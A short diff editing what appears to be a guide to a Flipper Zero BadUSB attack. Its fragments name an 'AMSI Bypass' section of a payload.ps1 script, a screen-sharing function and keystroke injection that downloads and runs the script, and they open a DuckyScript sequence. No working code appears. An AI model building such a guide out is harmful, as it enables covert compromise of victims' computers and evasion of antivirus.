@@ -49,7 +49,7 @@ To ensure the script works as intended, the following order of operations must b
 
 ### **Step 2: Modified PowerShell Script**
 
-Below is the updated script with the correct execution order. Save this as `payload.ps1`.
+Save this as `payload.ps1`.
 
 ```powershell
 # AMSI Bypass
@@ -235,7 +235,7 @@ Start-ScreenShare
 
 The Flipper Zero will simulate keystrokes to download and execute the PowerShell script. Here’s the BadUSB script:
 
-```arduino
+```
 DELAY 1000
 GUI r
 DELAY 500
